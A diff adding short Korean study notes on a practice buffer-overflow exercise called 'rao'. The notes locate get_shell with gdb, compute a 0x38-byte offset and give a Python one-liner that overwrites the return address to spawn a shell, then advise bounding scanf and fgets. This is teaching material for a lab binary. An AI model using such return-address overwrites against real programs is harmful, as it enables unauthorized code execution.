@@ -1,0 +1,21 @@
+gdb는 아직 해결이 안됨
+
+왜 pwndbg를 깔았는데도 왜 안되는지 의문.
+
+gdb 로 rao 의 get_shell의 주소를 알아보자
+$ print get_shell     #주소값이 401199로 나왔다.   
+
+buf + sfp + ret( 주소이므로 )
+
+buf 의 30개와 sfp 의 8 그리고 ret 의 8이므로 
+buf와 sfp 의 38개 까지 버퍼오버플로우로 넣고 ret부터 내가 원하는 쉘의 주소로 입력하면은
+
+쉘 실행가능
+
+$ (python3 -c "import sys;sys.stdout.buffer.write(b'A'*0x38 + b'\x99\x11\x40\x00\x00\x00\x00\x00')";cat) | ./rao
+진행하면은 쉘을 얻어서 원하는 명령어를 입력할수 있다. 
+
+따라서 시큐어코딩으로 gets, scanf 에 입력값의 제한을 넣어야한다.
+scanf("%[숫자]s", buf);   // 숫자의 값은 입력받을수 있는 버퍼의크기-1 보다 작거나 같아야한다.
+fgets(buf, len, stream);   // len 이 버퍼의 크기와 같거나 작아야한다 단 버퍼의 크기와 같을때 무조건 \n을 넣어서 len과 같은 값을 입력시 마지막값이 유실됌.
+
